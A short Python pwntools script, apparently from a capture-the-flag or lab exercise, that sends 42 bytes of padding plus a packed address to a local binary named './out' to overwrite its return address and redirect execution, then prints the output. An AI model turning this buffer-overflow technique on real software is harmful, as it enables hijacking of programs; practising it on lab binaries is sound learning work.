from pwn import *

p = process("./out");
buf_len=42
access = p32(0x80491d6)

payload = b'x'*buf_len + access

p.sendline(payload)

data = p.readall().strip().decode().splitlines()
for line in data:
	print(line)



